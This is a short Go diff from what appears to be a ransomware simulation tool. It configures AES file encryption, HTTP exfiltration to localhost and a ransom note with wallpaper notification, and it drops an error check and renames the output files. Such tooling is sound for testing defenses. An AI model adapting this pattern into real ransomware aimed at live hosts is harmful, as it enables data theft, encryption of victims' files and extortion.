@@ -115,7 +115,7 @@ func main() {
     sim.Encrypt = rw.AESEncrypt("password")
 
     // Set exfil method to be HTTP using provided helper function
-    sim.Exfil, e = rw.HTTPExfil(
+    sim.Exfil = rw.HTTPExfil(
         "http://localhost:8080",
         map[string]string{
             "User-Agent": strings.Join(
@@ -128,20 +128,17 @@ func main() {
             ),
         },
     )
-    if e != nil {
-        panic(e)
-    }
 
     // Notify user by changing wallpaper and leaving a ransom note,
     // using the provided helper functions
     sim.Notify = func() error {
         rw.RansomNote(
-            filepath.Join(home, "Desktop", "ransomnote.txt"),
+            filepath.Join(home, "desktop", "ransim.txt"),
             "This is a ransomware simulation.",
         )()
 
         rw.WallpaperNotify(
-            filepath.Join(home, "Desktop", "ransom.png"),
+            filepath.Join(home, "desktop", "ransim.png"),
             rw.DefaultPNG,
             rw.DesktopStretch,
             false,
